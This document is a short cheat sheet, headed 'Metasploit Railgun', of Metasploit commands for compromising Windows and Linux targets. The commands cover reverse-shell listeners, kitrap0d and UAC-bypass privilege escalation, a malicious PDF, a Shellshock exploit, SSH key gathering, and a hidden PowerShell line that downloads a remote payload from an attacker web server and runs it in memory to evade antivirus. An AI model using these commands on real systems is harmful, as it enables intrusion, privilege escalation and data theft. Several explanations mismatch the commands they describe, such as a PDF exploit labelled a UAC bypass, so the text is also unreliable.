## Metasploit Railgun


#### Example 1: 
Railgun payload that will be injected directly into the memory of the target Windows system using the Kitrap0d exploit

Step 1. Launching Metasploit and setting up a listener:
```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your IP address>
set LPORT 4444
run
```

Step 2. Create the payload:
```
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your IP address>
set LPORT 4444
set RHOST <target IP address>
set RPORT 445
exploit
```

#### Example 2: 
Using Railgun to bypass antivirus detection on the target Windows system:
```
use exploit/windows/local/bypassuac
set SESSION 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your IP address>
set LPORT 4444
set RHOST <target IP address>
set RPORT 445
set DisablePayloadHandler true
set CMDSTAGER::CMDLINE "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadString('<your web server URL>/payload.ps1') | Invoke-Expression"
exploit
```

Explanation: We're using the bypassuac exploit to bypass User Account Control (UAC) on the target system, allowing us to run our payload with elevated privileges. However, we are also using Railgun to bypass antivirus detection by downloading the payload from a web server and executing it in memory


#### Example 3:
In this example, we will use Railgun to bypass User Account Control (UAC) on the target system and escalate. Let's say we found a vulnerable version of the Adobe Acrobat Reader running on the target system:

```
use exploit/windows/fileformat/adobe_pdf_embedded_exe
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your IP address>
set LPORT 4444
set FILENAME evil.pdf
run
```

#### Example 4: 
Create a Railgun payload that will be injected into memory using the bypassuac exploit:
```
use exploit/windows/local/bypassuac
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your IP address>
set LPORT 4444
set SESSION 1
exploit

```

#### Example 5: 
Extract sensitive info from memory:
```
use exploit/windows/local/read_process_memory
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your IP address>
set LPORT 4444
set PROCESS <process ID>
set ADDRESS <memory address>
exploit
```

#### Example 6 (Linux): 
Exploting vulnerable version of the Apache web server running on the target system:
```
use exploit/linux/http/apache_mod_cgi_bash_env_exec
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <your IP address>
set LPORT 4444
set TARGETURI /cgi-bin/test.cgi
run
```

#### Example 7 (Linux): 
Escalation from a vulnerable version of the Sudo utility, using the udev_netlink exploit:
```
use exploit/linux/local/udev_netlink
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <your IP address>
set LPORT 4444
set SESSION 1
exploit
```

#### Example 8 (Linux): 
Exfil sensitive info from a vulnerable app:
```
use exploit/linux/local/proc_env_read
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <your IP address>
set LPORT 4444
set SESSION 1
set PID <process ID>
exploit

```
Enumerating SSH:
```
use post/linux/gather/enum_ssh_keys
set SESSION 1
run
```




